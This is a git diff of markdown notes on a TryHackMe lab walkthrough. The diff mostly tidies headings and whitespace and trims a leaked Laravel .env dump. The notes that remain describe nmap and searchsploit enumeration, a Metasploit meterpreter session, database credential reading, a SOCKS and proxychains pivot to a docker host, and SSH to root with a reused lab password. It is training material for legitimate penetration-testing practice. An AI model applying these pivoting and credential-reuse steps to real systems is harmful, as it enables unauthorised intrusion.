@@ -15,12 +15,12 @@ permalink: /tcm-sec_PEH/kioptrix/notes
   - [serchsploit](#serchsploit)
   - [Metaspliot Framework Console](#metaspliot-framework-console)
   - [Time to get to that Postgres DB](#time-to-get-to-that-postgres-db)
-  - [Now we need to scan the docker host](#now-we-need-to-scan-the-docker-host)
-    - [Either](#either)
-    - [OR: Use SOCKS Proxy](#or-use-socks-proxy)
+  - [Scan the docker host](#scan-the-docker-host)
+    - [Either with metasploit](#either-with-metasploit)
+    - [Or use SOCKS Proxy](#or-use-socks-proxy)
   - [Proxychains](#proxychains)
-  - [Either](#either-1)
-    - [Using proxychains](#using-proxychains)
+  - [Connect via SSH](#connect-via-ssh)
+    - [Either using proxychains](#either-using-proxychains)
     - [Or Metasploit](#or-metasploit)
 
 ## nmap
@@ -42,12 +42,14 @@ Nmap done: 1 IP address (1 host up) scanned in 38.90 seconds
 - port 80: open
 
 ## Browser
+
 See:
 
 - Laravel v8.26.1
 - PHP v7.4.30
 
-## serchsploit 
+## serchsploit
+
 ![searchspliot results](../../assets/TryHackMe/DockTheHalls/searchsploit_laravel8.jpg)
 
 ## Metaspliot Framework Console
@@ -89,38 +91,7 @@ DB_PORT=5432
 DB_DATABASE=postgres
 DB_USERNAME=postgres
 DB_PASSWORD=postgres
-
-BROADCAST_DRIVER=log
-CACHE_DRIVER=file
-QUEUE_CONNECTION=sync
-SESSION_DRIVER=file
-SESSION_LIFETIME=120
-
-REDIS_HOST=127.0.0.1
-REDIS_PASSWORD=null
-REDIS_PORT=6379
-
-MAIL_MAILER=smtp
-MAIL_HOST=smtp.mailtrap.io
-MAIL_PORT=2525
-MAIL_USERNAME=null
-MAIL_PASSWORD=null
-MAIL_ENCRYPTION=null
-MAIL_FROM_ADDRESS=null
-MAIL_FROM_NAME="${APP_NAME}"
-
-AWS_ACCESS_KEY_ID=
-AWS_SECRET_ACCESS_KEY=
-AWS_DEFAULT_REGION=us-east-1
-AWS_BUCKET=
-
-PUSHER_APP_ID=
-PUSHER_APP_KEY=
-PUSHER_APP_SECRET=        
-PUSHER_APP_CLUSTER=mt1
-
-MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
-MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+...
 ```
 
 - `meterpreter > resolve webservice_database`
@@ -231,15 +202,15 @@ Query Text: 'select * from users'
 > ... ssh maybe?  
 > ... docker host maybe?  
 
-## Now we need to scan the docker host
+## Scan the docker host
 
-### Either
+### Either with metasploit
 
 - `search portscan`
 - `use auxiliary/scanner/portscan/tcp`
 - `set rhosts 172.17.0.1` and `run` - 22 & 80 open
 
-### OR: Use SOCKS Proxy
+### Or use SOCKS Proxy
 
 - `search socks` & `use 1` & `exploit`
 
@@ -247,7 +218,7 @@ Query Text: 'select * from users'
 
 - Test proxy: `curl --proxy socks5://127.0.0.1:1080 http://172.17.0.1`
 
-> returns the html content seen @ 10.10.199.246 
+> returns the html content seen @ 10.10.199.246
 
 ## Proxychains
 
@@ -256,7 +227,7 @@ Query Text: 'select * from users'
 
 > Now make any call with `proxychains` infront of it
 
-- `proxychains curl http://172.17.0.1` or 
+- `proxychains curl http://172.17.0.1` or
 - `proxychains nmap -F -sV -sT 172.17.0.1`:
 
 ```console
@@ -272,15 +243,15 @@ Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
 
 > Port 22 is open on the docker host. Surely santa reused his credentials ;)
 
-## Either
+## Connect via SSH
 
-### Using proxychains
+### Either using proxychains
 
 - `proxychains ssh santa@172.17.0.1` & pw: `p4$$w0rd` -> root
 - `ls` & `cat root.tx`:
 `THM{47C61A0FA8738BA77308A8A600F88E4B}`
 
-### Or Metasploit 
+### Or Metasploit
 
 - `search ssh_login` & `use 0`
 - set 'rhosts', 'username' & 'password' & `exploit`
@@ -292,6 +263,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
+
 - checkout new sessions `sessions`
 
 ```console
